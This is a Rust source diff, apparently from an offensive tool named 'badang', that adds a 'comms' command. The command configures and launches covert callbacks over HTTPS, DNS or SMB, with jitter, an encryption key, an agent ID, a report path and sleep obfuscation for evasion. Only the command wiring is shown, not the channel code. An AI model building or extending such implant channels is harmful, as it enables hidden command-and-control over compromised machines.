@@ -507,6 +507,57 @@ fn main() {
                 }
             }
         }
+        "comms" => {
+            if cli.dry_run {
+                badang::comms::dry_run(
+                    &cli.comms_channel,
+                    &cli.comms_host,
+                    cli.comms_port,
+                    cli.comms_interval,
+                    &log,
+                );
+            } else {
+                let channel = match badang::comms::Channel::from_str(&cli.comms_channel) {
+                    Some(c) => c,
+                    None => {
+                        eprintln!(
+                            "ERROR: unknown channel '{}'. Use: https, dns, smb",
+                            cli.comms_channel
+                        );
+                        process::exit(1);
+                    }
+                };
+                let key = match badang::comms::parse_hex_key(&cli.comms_key) {
+                    Ok(k) => k,
+                    Err(e) => {
+                        eprintln!("ERROR: {}", e);
+                        process::exit(1);
+                    }
+                };
+                let config = badang::comms::CommsConfig {
+                    channel,
+                    host: cli.comms_host.clone(),
+                    port: cli.comms_port,
+                    path: cli.comms_path.clone(),
+                    result_path: String::from("/api/report"),
+                    interval_ms: cli.comms_interval,
+                    jitter_pct: cli.comms_jitter,
+                    key,
+                    agent_id: badang::comms::generate_agent_id(),
+                    use_sleep_obfs: cli.comms_use_sleep_obfs,
+                    max_retries: 10,
+                };
+                match badang::comms::run_comms(&config, &log) {
+                    Ok(result) => {
+                        log.info(format!("  {}: {}", result.channel.name(), result.description));
+                    }
+                    Err(e) => {
+                        eprintln!("ERROR: {}", e);
+                        process::exit(1);
+                    }
+                }
+            }
+        }
         _ => {
             eprintln!("Unknown command: {}", cli.command);
             process::exit(1);
